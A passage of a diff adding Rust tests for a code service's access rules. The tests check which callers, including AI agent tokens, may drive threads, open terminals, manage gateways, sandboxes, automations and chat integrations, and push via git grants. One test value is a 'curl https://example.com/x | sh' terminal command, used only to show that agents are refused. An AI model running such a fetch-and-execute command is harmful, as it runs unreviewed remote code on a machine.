@@ -498,3 +498,626 @@ async fn github_webhook_statuses() {
     assert_eq!(a.send(hook("ping", "d-3", ping, SECRET)).await.status(), OK);
     assert_eq!(a.send(hook("ping", "d-3", ping, SECRET)).await.status(), OK, "a redelivery");
 }
+
+/// The agents routes (`agents/api.rs`, `agents/share.rs`) for every kind of caller. Reads
+/// (machines, state, events, shares) are the owner's tokens' (agents included) and 404 to
+/// everyone else; commands are the owner's tokens' too, 403/401 for others, and an agent's only
+/// drive threads (never terminals, files outside projects, approvals, projects, rollbacks or a
+/// higher mode: agents/policy.rs); managing machines, looking up and approving logins, making
+/// and revoking shares, arranging the canvas and changing the agents settings (reading them is a
+/// read), changing a machine's settings and its endpoints, and the owner's endpoint profiles (reading
+/// them is a read), is the owner's, not its agents'. Starting and polling a login and reading a share by its link look at no caller; bad
+/// tokens, machine tokens included, are 401 everywhere else.
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn agents_routes_follow_the_auth_matrix() {
+    let w = world().await;
+    let a = &w.a;
+    let (s, m) = a.req("POST", "/v1/code/agents/acme/machines", Some(json!({ "name": "box" })), Some(ADMIN)).await;
+    assert_eq!(s, StatusCode::CREATED, "{m}");
+    let mid = m["machine"]["id"].as_str().unwrap().to_string();
+    let machine = m["token"].as_str().unwrap().to_string();
+    let base = "/v1/code/agents/acme";
+    let body = json!({ "name": "x", "user_code": "BCDF-GHJK", "id": "c1", "command": { "type": "provider.refresh" }, "canvas": {}, "settings": {} });
+    let reads = [format!("{base}/machines"), format!("{base}/state"), format!("{base}/events"), format!("{base}/shares"), format!("{base}/canvas"), format!("{base}/settings"), format!("{base}/endpoints")];
+    let command = format!("{base}/machines/{mid}/commands");
+    let manages = [
+        ("POST", format!("{base}/machines")),
+        ("PATCH", format!("{base}/machines/{mid}")),
+        ("DELETE", format!("{base}/machines/{mid}")),
+        ("POST", format!("{base}/login/approve")),
+        ("POST", format!("{base}/login/deny")),
+        ("GET", format!("{base}/login/BCDF-GHJK")),
+        ("POST", format!("{base}/threads/thr_x/shares")),
+        ("DELETE", format!("{base}/shares/shr_x")),
+        ("PUT", format!("{base}/canvas")),
+        ("PUT", format!("{base}/settings")),
+        ("PUT", format!("{base}/endpoints/gw")),
+        ("DELETE", format!("{base}/endpoints/gw")),
+    ];
+    let (acme, agent, other, app_in) = (Some(w.acme.as_str()), Some(w.agent.as_str()), Some(w.other.as_str()), Some(w.app_in.as_str()));
+    let denied = StatusCode::UNAUTHORIZED;
+    for (who, who_token, read, drive) in [
+        ("admin", Some(ADMIN), OK, StatusCode::SERVICE_UNAVAILABLE),
+        ("owner", acme, OK, StatusCode::SERVICE_UNAVAILABLE),
+        ("agent", agent, OK, FORBIDDEN),
+        ("review app", app_in, NOT_FOUND, FORBIDDEN),
+        ("another owner", other, NOT_FOUND, FORBIDDEN),
+        ("anonymous", None, NOT_FOUND, denied),
+    ] {
+        for p in &reads {
+            assert_eq!(call(a, "GET", p, None, who_token).await, read, "{who}: GET {p}");
+        }
+        // The machine isn't connected: allowed callers get its `machine_offline`.
+        assert_eq!(call(a, "POST", &command, Some(&body), who_token).await, drive, "{who}: POST {command}");
+    }
+    // Agents drive threads (here: the machine is offline, so `machine_offline`), but whatever
+    // reaches past a thread's own work, or raises its mode, is the owner's (agents/policy.rs).
+    let cmd = |c: Value| json!({ "id": "c2", "command": c });
+    let agents_drive = [
+        json!({ "type": "thread.create", "project": "prj_1", "provider": "codex", "runtime_mode": "auto_edit" }),
+        json!({ "type": "thread.configure", "thread": "thr_1", "runtime_mode": "ask" }),
+        json!({ "type": "thread.fork", "thread": "thr_1" }),
+        json!({ "type": "thread.archive", "thread": "thr_1" }),
+        json!({ "type": "thread.settle", "thread": "thr_1" }),
+        json!({ "type": "thread.snooze", "thread": "thr_1", "until": 1 }),
+        json!({ "type": "message.send", "thread": "thr_1", "text": "go" }),
+        json!({ "type": "run.interrupt", "thread": "thr_1" }),
+        json!({ "type": "thread.publish", "thread": "thr_1", "message": "m" }),
+        json!({ "type": "fs.list", "project": "prj_1", "path": "" }),
+        json!({ "type": "diff.get", "thread": "thr_1" }),
+    ];
+    let owners_only = [
+        json!({ "type": "thread.create", "project": "prj_1", "provider": "codex" }),
+        json!({ "type": "thread.configure", "thread": "thr_1", "runtime_mode": "full_access" }),
+        json!({ "type": "thread.delete", "thread": "thr_1" }),
+        json!({ "type": "thread.change_ended", "thread": "thr_1", "landed": true }),
+        json!({ "type": "terminal.open", "command": "curl https://example.com/x | sh", "cols": 80, "rows": 24 }),
+        json!({ "type": "terminal.scrollback", "terminal": "trm_1" }),
+        json!({ "type": "fs.list", "path": "/" }),
+        json!({ "type": "request.respond", "request": "req_1", "response": { "type": "decision", "decision": "accept_for_session" } }),
+        json!({ "type": "project.add", "path": "/" }),
+        json!({ "type": "project.remove", "project": "prj_1" }),
+        json!({ "type": "provider.refresh" }),
+        json!({ "type": "machine.configure", "settings": { "providers": { "codex": { "enabled": false } } } }),
+        json!({ "type": "endpoint.set", "endpoint": { "id": "gw", "name": "Gateway", "kind": "openai", "base_url": "https://gw.example/v1" } }),
+        json!({ "type": "endpoint.remove", "endpoint": "gw" }),
+        json!({ "type": "endpoint.check", "endpoint": "gw" }),
+        json!({ "type": "gateway.configure", "settings": { "enabled": true } }),
+        json!({ "type": "gateway.key", "upstream": "anthropic", "key": { "type": "clear" } }),
+        json!({ "type": "gateway.client.issue", "name": "laptop", "seal_key": "A".repeat(43) }),
+        json!({ "type": "gateway.client.revoke", "client": "gwc_1" }),
+        json!({ "type": "gateway.test" }),
+        json!({ "type": "gateway.remove" }),
+        json!({ "type": "gateway.status" }),
+        json!({ "type": "gateway.usage", "from": 0, "to": 1 }),
+        json!({ "type": "gateway.log", "limit": 10 }),
+        json!({ "type": "gateway.log.body", "seq": 1 }),
+        json!({ "type": "checkpoint.rollback", "thread": "thr_1", "checkpoint": "chk_1" }),
+    ];
+    for c in agents_drive {
+        for who_token in [acme, agent] {
+            assert_eq!(call(a, "POST", &command, Some(&cmd(c.clone())), who_token).await, StatusCode::SERVICE_UNAVAILABLE, "{who_token:?}: {c}");
+        }
+    }
+    for c in owners_only {
+        assert_eq!(call(a, "POST", &command, Some(&cmd(c.clone())), acme).await, StatusCode::SERVICE_UNAVAILABLE, "owner: {c}");
+        assert_eq!(call(a, "POST", &command, Some(&cmd(c.clone())), agent).await, FORBIDDEN, "agent: {c}");
+    }
+    let projects = format!("{base}/machines/{mid}/projects");
+    assert_eq!(call(a, "POST", &projects, Some(&json!({ "id": "p1", "repo": { "name": "fresh" } })), agent).await, FORBIDDEN, "agent: POST {projects}");
+    for (who, who_token, want) in [("agent", agent, FORBIDDEN), ("review app", app_in, FORBIDDEN), ("another owner", other, FORBIDDEN), ("anonymous", None, denied)] {
+        for (m, p) in &manages {
+            assert_eq!(call(a, m, p, Some(&body), who_token).await, want, "{who}: {m} {p}");
+        }
+    }
+    for bad in ["rlc_0000", "rla_0000", "hunter2", w.revoked.as_str(), machine.as_str()] {
+        let all = reads.iter().map(|p| ("GET", p.clone())).chain([("POST", command.clone())]).chain(manages.iter().cloned());
+        for (m, p) in all {
+            assert_eq!(call(a, m, &p, Some(&body), Some(bad)).await, denied, "{bad}: {m} {p}");
+        }
+        assert_eq!(call(a, "POST", "/v1/code/agents/login", None, Some(bad)).await, OK);
+        assert_eq!(call(a, "POST", "/v1/code/agents/login/poll", Some(&json!({ "device_code": "rld_x" })), Some(bad)).await, OK);
+        assert_eq!(call(a, "GET", "/v1/code/agents/shares/shr_x", None, Some(bad)).await, NOT_FOUND);
+    }
+    for who_token in [Some(ADMIN), acme, agent, other, app_in, None] {
+        assert_eq!(call(a, "GET", "/v1/code/agents/shares/shr_x", None, who_token).await, NOT_FOUND, "{who_token:?}");
+    }
+    // The owner manages (an unknown login code, thread or share is a 404 after the check).
+    for (m, p) in &manages {
+        let want = match (*m, p.as_str()) {
+            ("POST", p) if p.ends_with("/machines") => StatusCode::CREATED,
+            ("PATCH", _) | ("PUT", _) => OK,
+            // The profile the PUT before it made.
+            ("DELETE", p) if p.contains("/machines/") || p.contains("/endpoints/") => StatusCode::NO_CONTENT,
+            _ => NOT_FOUND,
+        };
+        let endpoint = json!({ "name": "Gateway", "kind": "openai", "base_url": "https://gw.example/v1" });
+        let body = if p.contains("/endpoints/") { &endpoint } else { &body };
+        assert_eq!(call(a, m, p, Some(body), acme).await, want, "owner: {m} {p}");
+    }
+    // The link: only machine tokens (without an upgrade, the token's machine).
+    assert_eq!(call(a, "GET", "/v1/code/agents/connect", None, Some(&machine)).await, denied, "revoked by the owner above");
+    assert_eq!(call(a, "GET", "/v1/code/agents/connect", None, acme).await, denied);
+    assert_eq!(call(a, "GET", "/v1/code/agents/connect", None, None).await, denied);
+    for who_token in [Some(ADMIN), acme, agent, other, None] {
+        assert_eq!(call(a, "DELETE", "/v1/code/agents/connect", None, who_token).await, denied, "{who_token:?}");
+    }
+}
+
+/// The model gateway's routes (`agents/gateway.rs`): all the owner's (Code::manages), not its
+/// agents'; 403 for agents, review apps and other owners, 401 for anonymous callers and bad tokens.
+/// The owner reads `null` for a gateway that isn't set up and gets a 404 changing it, after the check.
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn agents_gateway_routes_follow_the_auth_matrix() {
+    let w = world().await;
+    let a = &w.a;
+    let (s, m) = a.req("POST", "/v1/code/agents/acme/machines", Some(json!({ "name": "studio" })), Some(ADMIN)).await;
+    assert_eq!(s, StatusCode::CREATED, "{m}");
+    let host = m["machine"]["id"].as_str().unwrap().to_string();
+    let base = "/v1/code/agents/acme/gateway";
+    let plan = json!({ "host": host, "urls": [{ "label": "LAN", "url": "http://gw.lan:8790" }], "acknowledged_at": 1 });
+    let join = json!({ "machine": host });
+    let routes = [
+        ("GET", base.to_string(), None),
+        ("PUT", base.to_string(), Some(&plan)),
+        ("DELETE", base.to_string(), None),
+        ("POST", format!("{base}/members"), Some(&join)),
+        ("DELETE", format!("{base}/members/{host}"), None),
+    ];
+    let (acme, agent, other, app_in) = (Some(w.acme.as_str()), Some(w.agent.as_str()), Some(w.other.as_str()), Some(w.app_in.as_str()));
+    for (who, token, want) in [("agent", agent, FORBIDDEN), ("review app", app_in, FORBIDDEN), ("another owner", other, FORBIDDEN), ("anonymous", None, UNAUTHORIZED)] {
+        for (m, p, body) in &routes {
+            assert_eq!(call(a, m, p, *body, token).await, want, "{who}: {m} {p}");
+        }
+    }
+    for bad in ["rlc_0000", "rla_0000", "hunter2", w.revoked.as_str()] {
+        for (m, p, body) in &routes {
+            assert_eq!(call(a, m, p, *body, Some(bad)).await, UNAUTHORIZED, "{bad}: {m} {p}");
+        }
+    }
+    // The owner: nothing set up reads as null and is a 404 to change; then the plan, a join (the
+    // host has no link: 409, it never said its seal key), a member that isn't one, and the plan removed.
+    assert_eq!(a.req("GET", base, None, acme).await, (OK, serde_json::Value::Null));
+    for (m, p, body) in routes.iter().filter(|(m, ..)| *m != "PUT" && *m != "GET") {
+        assert_eq!(call(a, m, p, *body, acme).await, NOT_FOUND, "owner: {m} {p}");
+    }
+    assert_eq!(call(a, "PUT", base, Some(&plan), acme).await, OK);
+    assert_eq!(call(a, "GET", base, None, acme).await, OK);
+    assert_eq!(call(a, "POST", &format!("{base}/members"), Some(&join), acme).await, StatusCode::CONFLICT);
+    assert_eq!(call(a, "DELETE", &format!("{base}/members/{host}"), None, acme).await, NOT_FOUND);
+    assert_eq!(call(a, "DELETE", base, None, Some(ADMIN)).await, StatusCode::NO_CONTENT);
+}
+
+/// The sandbox routes (`agents/sandbox/api.rs`): all of them are the owner's (Code::manages), not
+/// its agents'; 401 for anonymous callers and bad tokens (machine tokens too), 403 for everyone
+/// else. Here no backend is set up: creating is a 503 and an unknown sandbox a 404, after the check.
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn sandbox_routes_follow_the_auth_matrix() {
+    let w = world().await;
+    let a = &w.a;
+    let (s, m) = a.req("POST", "/v1/code/agents/acme/machines", Some(json!({ "name": "box" })), Some(ADMIN)).await;
+    assert_eq!(s, StatusCode::CREATED, "{m}");
+    let machine = m["token"].as_str().unwrap().to_string();
+    let base = "/v1/code/agents/acme/sandboxes";
+    let routes = [
+        ("GET", base.to_string(), OK),
+        ("GET", format!("{base}/usage"), OK),
+        ("POST", base.to_string(), StatusCode::SERVICE_UNAVAILABLE),
+        ("POST", format!("{base}/sbx_nope/start"), NOT_FOUND),
+        ("POST", format!("{base}/sbx_nope/stop"), NOT_FOUND),
+        ("DELETE", format!("{base}/sbx_nope"), NOT_FOUND),
+    ];
+    let body = json!({ "name": "s" });
+    for (who, token) in [("admin", Some(ADMIN)), ("owner", Some(w.acme.as_str()))] {
+        for (m, p, want) in &routes {
+            assert_eq!(call(a, m, p, Some(&body), token).await, *want, "{who}: {m} {p}");
+        }
+    }
+    let denied = StatusCode::UNAUTHORIZED;
+    for (who, token, want) in [
+        ("agent", Some(w.agent.as_str()), FORBIDDEN),
+        ("review app", Some(w.app_in.as_str()), FORBIDDEN),
+        ("another owner", Some(w.other.as_str()), FORBIDDEN),
+        ("anonymous", None, denied),
+        ("revoked", Some(w.revoked.as_str()), denied),
+        ("machine", Some(machine.as_str()), denied),
+        ("garbage", Some("hunter2"), denied),
+    ] {
+        for (m, p, _) in &routes {
+            assert_eq!(call(a, m, p, Some(&body), token).await, want, "{who}: {m} {p}");
+        }
+    }
+}
+
+/// A command to a connected test daemon, answered `ok`: the grant it came with.
+async fn granted(a: &App, d: &mut common::daemon::Daemon, mid: &str, command: Value, token: &str) -> Option<agent_proto::CodeGrant> {
+    use tower::ServiceExt;
+    let router = a.router.clone();
+    let req = Request::post(format!("/v1/code/agents/acme/machines/{mid}/commands"))
+        .header("content-type", "application/json")
+        .header("authorization", format!("Bearer {token}"))
+        .body(Body::from(json!({ "id": format!("c-{}", rand::random::<u64>()), "command": command }).to_string()))
+        .unwrap();
+    let sent = tokio::spawn(async move { router.oneshot(req).await.unwrap().status() });
+    let Some(agent_proto::RelayFrame::Command { id, grant, .. }) = d.recv().await else { panic!("expected a command") };
+    d.send(&agent_proto::DaemonFrame::Reply { id, result: agent_proto::Reply::Ok }).await;
+    assert_eq!(sent.await.unwrap(), OK);
+    grant.map(|g| *g)
+}
+
+fn command_path(mid: &str) -> String {
+    format!("/v1/code/agents/acme/machines/{mid}/commands")
+}
+
+/// `GET /git/acme/{repo}.git/info/refs?service=…` with a bearer token: git's first request.
+async fn git_refs(a: &App, repo: &str, service: &str, token: &str) -> StatusCode {
+    let req = Request::get(format!("/git/acme/{repo}.git/info/refs?service={service}")).header("authorization", format!("Bearer {token}")).body(Body::empty()).unwrap();
+    a.send(req).await.status()
+}
+
+/// A machine's grant (minted by the relay for one command) opens git for its one repo, pushes
+/// only when the command's sender may write and then only the thread's own branch, never opens the API, and ends when it expires or
+/// the machine is revoked. The routes that start repos and give threads work are the commands'.
+#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+async fn agent_grants_follow_the_auth_matrix() {
+    use agent_proto::{Entity, RepoRef, Stamped};
+    let w = world().await;
+    let a = &w.a;
+    let url = a.serve().await;
+    let (s, m) = a.req("POST", "/v1/code/agents/acme/machines", Some(json!({ "name": "box" })), Some(ADMIN)).await;
+    assert_eq!(s, StatusCode::CREATED, "{m}");
+    let (mid, machine) = (m["machine"]["id"].as_str().unwrap().to_string(), m["token"].as_str().unwrap().to_string());
+    let (mut d, _) = common::daemon::Daemon::connect(&url, &machine).await;
+    // The daemon's records: a project that is a checkout of acme/priv, and a thread in it.
+    let project: Entity = serde_json::from_value(json!({
+        "kind": "project", "id": "prj_1", "name": "priv", "path": "/src/priv", "repo": { "owner": "acme", "repo": "priv" }, "created_at": 1, "updated_at": 1
+    }))
+    .unwrap();
+    let thread: Entity = serde_json::from_value(json!({
+        "kind": "thread", "id": "thr_1", "project": "prj_1", "title": "t", "provider": "codex", "model": null, "runtime_mode": "full_access",
+        "interaction_mode": "default", "cwd": "/src/priv-t", "worktree": { "path": "/src/priv-t", "branch": "roll/t", "base": "abc" },
+        "status": "idle", "run_count": 0, "pending_requests": 0, "created_at": 1, "updated_at": 1
+    }))
+    .unwrap();
+    // Threads that can't be published as a branch of their own: no worktree, or on main.
+    let mut on_main = thread.clone();
+    let mut no_worktree = thread.clone();
+    if let (Entity::Thread(m), Entity::Thread(n)) = (&mut on_main, &mut no_worktree) {
+        (m.id, n.id) = (agent_proto::ThreadId("thr_main".into()), agent_proto::ThreadId("thr_here".into()));
+        m.worktree.as_mut().unwrap().branch = "main".into();
+        n.worktree = None;
+    }
+    d.upsert(vec![Stamped { seq: 1, entity: project }, Stamped { seq: 2, entity: thread }, Stamped { seq: 3, entity: on_main }, Stamped { seq: 4, entity: no_worktree }]).await;
+    let publish = json!({ "type": "thread.publish", "thread": "thr_1", "message": "m" });
+
+    // Publishing, by the owner or its agent: a grant that pushes to acme/priv and nothing else.
+    let mut push = String::new();
+    for who in [&w.acme, &w.agent] {
+        let g = granted(a, &mut d, &mid, publish.clone(), who).await.expect("a grant");
+        assert!(g.write && g.token.starts_with("rlg_") && g.url.ends_with("/acme/priv.git"), "{g:?}");
+        assert_eq!(g.repo, RepoRef { owner: "acme".into(), repo: "priv".into() });
+        assert_eq!(git_refs(a, "priv", "git-upload-pack", &g.token).await, OK);
+        assert_eq!(git_refs(a, "priv", "git-receive-pack", &g.token).await, OK);
+        assert_eq!(git_refs(a, "pub", "git-upload-pack", &g.token).await, NOT_FOUND);
+        for p in ["/v1/code/repos/acme/priv", "/v1/code/agents/acme/state", "/v1/code/repos/acme/priv/changes"] {
+            assert_eq!(call(a, "GET", p, None, Some(&g.token)).await, UNAUTHORIZED, "{p}");
+        }
+        push = g.token;
+    }
+    // A publish grant pushes the thread's branch and nothing else: not main, another branch or a
+    // tag, never a delete, and an atomic push with any of those pushes nothing.
+    let home = tempfile::tempdir().unwrap();
+    let work = tempfile::tempdir().unwrap();
+    let remote = format!("{url}/git/acme/priv.git");
+    let header = format!("http.extraHeader=Authorization: Bearer {push}");
+    let with_grant = |args: &[&str]| {
+        let mut all = vec!["-c", header.as_str()];
+        all.extend_from_slice(args);
+        common::git_raw(home.path(), work.path(), &all)
+    };
+    assert!(with_grant(&["clone", "-q", &remote, "."]).status.success());
+    let main_before = common::git(home.path(), work.path(), &["rev-parse", "origin/main"]);
+    common::write(work.path(), "agent.txt", "work\n");
+    common::git(home.path(), work.path(), &["add", "-A"]);
+    common::git(home.path(), work.path(), &["commit", "-q", "-m", "agent work"]);
+    for refspec in ["HEAD:refs/heads/main", "HEAD:refs/heads/elsewhere", "HEAD:refs/tags/v9"] {
+        let out = with_grant(&["push", &remote, refspec]);
+        let err = String::from_utf8_lossy(&out.stderr);
+        assert!(!out.status.success() && err.contains("only pushes refs/heads/roll/t"), "{refspec}: {err}");
+    }
+    let out = with_grant(&["push", "--atomic", &remote, "HEAD:refs/heads/roll/t", "HEAD:refs/heads/main"]);
+    assert!(!out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
+    let out = with_grant(&["push", &remote, "HEAD:refs/heads/roll/t"]);
+    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
+    let out = with_grant(&["push", &remote, ":refs/heads/roll/t"]);
+    assert!(!out.status.success(), "a delete: {}", String::from_utf8_lossy(&out.stderr));
+    let refs = String::from_utf8(with_grant(&["ls-remote", &remote]).stdout).unwrap();
+    assert!(refs.contains("refs/heads/roll/t") && !refs.contains("elsewhere") && !refs.contains("refs/tags/v9"), "{refs}");
+    assert!(refs.lines().any(|l| l == format!("{}\trefs/heads/main", main_before.trim())), "main moved: {refs}");
+    for thread in ["thr_main", "thr_here"] {
+        let body = json!({ "id": format!("c-{thread}"), "command": { "type": "thread.publish", "thread": thread, "message": "m" } });
+        let want = if thread == "thr_main" { StatusCode::BAD_REQUEST } else { StatusCode::OK };
+        if want == StatusCode::OK {
+            assert!(granted(a, &mut d, &mid, body["command"].clone(), &w.acme).await.is_none(), "no worktree: no grant");
+        } else {
+            assert_eq!(call(a, "POST", &command_path(&mid), Some(&body), Some(&w.acme)).await, want, "{thread}");
+        }
+    }
+
+    // Cloning: fetch only.
+    let clone = json!({ "type": "project.add", "path": "", "clone": { "owner": "acme", "repo": "pub" } });
+    let g = granted(a, &mut d, &mid, clone, &w.acme).await.expect("a grant");
+    assert!(!g.write);
+    assert_eq!(git_refs(a, "pub", "git-upload-pack", &g.token).await, OK);
+    assert_eq!(git_refs(a, "pub", "git-receive-pack", &g.token).await, FORBIDDEN);
+    // Commands that touch no repo get none.
+    assert!(granted(a, &mut d, &mid, json!({ "type": "provider.refresh" }), &w.acme).await.is_none());
+    // Only the machine owner's own repos, and ones that exist.
+    let (s, v) = a.req("POST", "/v1/code/repos", Some(json!({ "owner": "other", "name": "theirs" })), Some(ADMIN)).await;
+    assert_eq!(s, StatusCode::CREATED, "{v}");
+    let command = command_path(&mid);
+    for (repo, want) in [("other/theirs", StatusCode::BAD_REQUEST), ("acme/nope", NOT_FOUND)] {
+        let (owner, name) = repo.split_once('/').unwrap();
+        let body = json!({ "id": "c-refused", "command": { "type": "project.add", "path": "", "clone": { "owner": owner, "repo": name } } });
+        assert_eq!(call(a, "POST", &command, Some(&body), Some(&w.acme)).await, want, "{repo}");
+    }
+    // An expired grant, and tokens that look like one.
+    let priv_id = a.req("GET", "/v1/code/repos/acme/priv", None, Some(ADMIN)).await.1["id"].as_str().unwrap().to_string();
+    let expired = "rlg_0000000000000000000000000000000000000000000000ff";
+    let hash = hex::encode(<sha2::Sha256 as sha2::Digest>::digest(expired.as_bytes()));
+    code_control::agents::store::insert_grant(a.code.db.sql(), &hash, &mid, &priv_id, Some("refs/heads/roll/t"), 1).unwrap();
+    for t in [expired, "rlg_nope"] {
+        assert_eq!(git_refs(a, "priv", "git-upload-pack", t).await, UNAUTHORIZED, "{t}");
+    }
+
+    // Starting a repo on a machine and giving a thread work: who may drive the agents.
+    let base = "/v1/code/agents/acme";
+    let projects = format!("{base}/machines/{mid}/projects");
+    let work = format!("{base}/threads/thr_1/work");
+    let (start, take) = (json!({ "id": "p1", "repo": { "name": "fresh" } }), json!({ "work": w.ids["priv.work"] }));
+    for (who, token, want) in [
+        ("review app", Some(w.app_in.as_str()), FORBIDDEN),
+        ("another owner", Some(w.other.as_str()), FORBIDDEN),
+        ("anonymous", None, UNAUTHORIZED),
+        ("revoked", Some(w.revoked.as_str()), UNAUTHORIZED),
+        ("a grant", Some(push.as_str()), UNAUTHORIZED),
+    ] {
+        assert_eq!(call(a, "POST", &projects, Some(&start), token).await, want, "{who}: POST {projects}");
+        assert_eq!(call(a, "POST", &work, Some(&take), token).await, want, "{who}: POST {work}");
+        assert_eq!(call(a, "DELETE", &work, None, token).await, want, "{who}: DELETE {work}");
+    }
+    assert_eq!(call(a, "POST", &work, Some(&take), Some(&w.acme)).await, OK);
+    assert_eq!(call(a, "DELETE", &work, None, Some(&w.agent)).await, StatusCode::NO_CONTENT);
+    assert_eq!(call(a, "POST", &format!("{base}/threads/thr_nope/work"), Some(&take), Some(&w.acme)).await, NOT_FOUND);
+    assert_eq!(call(a, "POST", &format!("{base}/machines/mch_nope/projects"), Some(&start), Some(&w.acme)).await, NOT_FOUND);
+    assert_eq!(call(a, "POST", &projects, Some(&json!({ "id": "p2" })), Some(&w.acme)).await, StatusCode::BAD_REQUEST);
+
+    // Revoking the machine ends its grants at once.
+    assert_eq!(call(a, "DELETE", &format!("{base}/machines/{mid}"), None, Some(ADMIN)).await, StatusCode::NO_CONTENT);
+    assert_eq!(git_refs(a, "priv", "git-upload-pack", &push).await, UNAUTHORIZED);
+}
+
+/// The automation routes (`agents/automations/api.rs`): reading them (lists, runs, the catalog,
+/// dry runs) is the owner's tokens', agents included, and 404 to everyone else; changing
+/// automations and their secrets, cancelling and retrying runs is Code::manages (403 agents and
+/// other owners, 401 anonymous and bad tokens); running one by hand too, unless it allows
+/// agents. The webhook ingress takes no token (its signature is the credential).
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn automation_routes_follow_the_auth_matrix() {
+    let w = world().await;
+    let a = &w.a;
+    let base = "/v1/code/agents/acme/automations";
+    let spec = json!({ "name": "n", "trigger": { "type": "manual" }, "steps": [{ "id": "t", "kind": "notify", "config": { "title": "x" } }] });
+    let (s, v) = a.req("POST", base, Some(spec.clone()), Some(ADMIN)).await;
+    assert_eq!(s, StatusCode::CREATED, "{v}");
+    let id = v["automation"]["id"].as_str().unwrap().to_string();
+    let open = { let mut o = spec.clone(); o["allow_agents"] = json!(true); o };
+    let (_, v) = a.req("POST", base, Some(open), Some(ADMIN)).await;
+    let open_id = v["automation"]["id"].as_str().unwrap().to_string();
+    let test = json!({ "automation": spec, "event": { "source": "manual", "kind": "run" } });
+    let reads: Vec<(&str, String, Option<Value>, StatusCode)> = vec![
+        ("GET", base.to_string(), None, OK),
+        ("GET", format!("{base}/catalog"), None, OK),
+        ("POST", format!("{base}/test"), Some(test), OK),
+        ("GET", format!("{base}/runs"), None, OK),
+        ("GET", format!("{base}/notices"), None, OK),
+        ("GET", format!("{base}/notices?limit=0"), None, StatusCode::BAD_REQUEST),
+        ("GET", format!("{base}/runs/arn_nope"), None, NOT_FOUND),
+        ("GET", format!("{base}/{id}"), None, OK),
+        ("GET", format!("{base}/{id}/runs"), None, OK),
+    ];
+    let writes: Vec<(&str, String, Option<Value>, StatusCode)> = vec![
+        ("POST", base.to_string(), Some(spec.clone()), StatusCode::CREATED),
+        ("PUT", format!("{base}/{id}"), Some(spec.clone()), OK),
+        ("POST", format!("{base}/{id}/disable"), None, OK),
+        ("POST", format!("{base}/{id}/enable"), None, OK),
+        ("PUT", format!("{base}/{id}/secrets/TOKEN"), Some(json!({ "value": "v" })), StatusCode::UNPROCESSABLE_ENTITY),
+        ("DELETE", format!("{base}/{id}/secrets/TOKEN"), None, StatusCode::NO_CONTENT),
+        ("POST", format!("{base}/{id}/webhook/secret"), None, NOT_FOUND),
+        ("POST", format!("{base}/runs/arn_nope/cancel"), None, NOT_FOUND),
+        ("POST", format!("{base}/runs/arn_nope/retry"), None, NOT_FOUND),
+        ("POST", format!("{base}/{id}/run"), Some(json!({})), StatusCode::ACCEPTED),
+        ("POST", format!("{base}/{id}/run"), Some(json!({ "data": { "title": "main is red" } })), StatusCode::ACCEPTED),
+        ("POST", format!("{base}/{id}/run"), Some(json!({ "data": "main is red" })), StatusCode::BAD_REQUEST),
+    ];
+    for (who, token) in [("admin", Some(ADMIN)), ("owner", Some(w.acme.as_str()))] {
+        for (m, p, b, want) in reads.iter().chain(&writes) {
+            assert_eq!(call(a, m, p, b.as_ref(), token).await, *want, "{who}: {m} {p}");
+        }
+    }
+    // Agents read, and run only what allows them.
+    for (m, p, b, want) in &reads {
+        assert_eq!(call(a, m, p, b.as_ref(), Some(&w.agent)).await, *want, "agent: {m} {p}");
+    }
+    for (m, p, b, _) in &writes {
+        assert_eq!(call(a, m, p, b.as_ref(), Some(&w.agent)).await, FORBIDDEN, "agent: {m} {p}");
+    }
+    assert_eq!(call(a, "POST", &format!("{base}/{open_id}/run"), Some(&json!({})), Some(&w.agent)).await, StatusCode::ACCEPTED);
+    let denied = StatusCode::UNAUTHORIZED;
+    for (who, token, read, write) in [
+        ("review app", Some(w.app_in.as_str()), NOT_FOUND, FORBIDDEN),
+        ("another owner", Some(w.other.as_str()), NOT_FOUND, FORBIDDEN),
+        ("anonymous", None, NOT_FOUND, denied),
+        ("revoked", Some(w.revoked.as_str()), denied, denied),
+        ("garbage", Some("hunter2"), denied, denied),
+    ] {
+        for (m, p, b, _) in &reads {
+            assert_eq!(call(a, m, p, b.as_ref(), token).await, read, "{who}: {m} {p}");
+        }
+        for (m, p, b, _) in &writes {
+            assert_eq!(call(a, m, p, b.as_ref(), token).await, write, "{who}: {m} {p}");
+        }
+    }
+    // The ingress: no token; not a webhook automation (404), and unsigned for one (401: no secret
+    // key on this server makes webhooks unavailable, 422 at creation).
+    for token in [None, Some(w.acme.as_str())] {
+        assert_eq!(call(a, "POST", &format!("{base}/{id}/webhook"), Some(&json!({})), token).await, NOT_FOUND);
+    }
+    let hook = json!({ "name": "h", "trigger": { "type": "webhook" }, "steps": [{ "id": "t", "kind": "notify", "config": { "title": "x" } }] });
+    assert_eq!(call(a, "POST", base, Some(&hook), Some(ADMIN)).await, StatusCode::UNPROCESSABLE_ENTITY);
+    assert_eq!(call(a, "DELETE", &format!("{base}/{id}"), None, Some(&w.agent)).await, FORBIDDEN);
+    assert_eq!(call(a, "DELETE", &format!("{base}/{id}"), None, Some(&w.acme)).await, StatusCode::NO_CONTENT);
+}
+
+/// Chat ops (docs/code/chatops.md): the owner manages its integrations; its agents, other owners
+/// and review apps can't, and anonymous callers are 401. The platforms' endpoints look at no
+/// caller: they answer 404 while the platform isn't configured, and check the platform's
+/// signature when it is (chatops.rs).
+#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
+async fn chatops_routes_follow_the_auth_matrix() {
+    let w = world().await;
+    let a = &w.a;
+    let base = "/v1/code/agents/acme/integrations";
+    let body = json!({ "members": ["U1"] });
+    let (acme, agent, other, app_in) = (Some(w.acme.as_str()), Some(w.agent.as_str()), Some(w.other.as_str()), Some(w.app_in.as_str()));
+    assert_eq!(call(a, "GET", base, None, acme).await, OK);
+    // Not configured on this server: the owner is told so; a missing install is a 404.
+    assert_eq!(call(a, "POST", &format!("{base}/slack/install"), None, acme).await, StatusCode::UNPROCESSABLE_ENTITY);
+    assert_eq!(call(a, "POST", &format!("{base}/discord/install"), None, acme).await, StatusCode::UNPROCESSABLE_ENTITY);
+    assert_eq!(call(a, "POST", &format!("{base}/teams/install"), None, acme).await, NOT_FOUND);
